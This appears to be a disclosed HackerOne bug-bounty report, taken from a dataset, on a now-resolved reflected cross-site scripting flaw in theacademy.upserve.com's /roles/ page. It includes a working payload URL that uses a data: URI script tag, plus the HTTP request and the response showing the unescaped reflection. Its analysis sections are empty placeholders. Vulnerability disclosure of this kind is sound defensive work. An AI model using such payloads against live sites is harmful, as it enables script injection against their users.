---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '389592'
original_report_id: '389592'
title: '[theacademy.upserve.com] Reflected XSS Query-String'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: upserve
created_at: '2018-08-02T11:35:23.605Z'
disclosed_at: '2018-10-19T13:24:44.659Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: theacademy.upserve.com
asset_type: URL
max_severity: low
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [theacademy.upserve.com] Reflected XSS Query-String

## Metadata

- HackerOne Report ID: 389592
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: upserve
- Disclosed At: 2018-10-19T13:24:44.659Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Steps To Reproduce:**
Open URL in FireFox:
```
https://theacademy.upserve.com/roles/?%22%3E%3Cscript//src=data&colon;,alert(location)//
```

**HTTP Request**
```http
GET /roles/?%22%3E%3Cscript//src=data&colon;,alert(location)// HTTP/1.1
Host: theacademy.upserve.com
```

**HTTP Response**
```html
<a class="category dropdown-item name-sort sorting-desc" href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=name&order=DESC">Name</a>
<a class="category dropdown-item views-sort " href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=views&order=DESC" >Views</a>
<a class="category dropdown-item duration-sort " href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=duration&order=DESC">Duration</a>
```

## Impact

Reflected XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
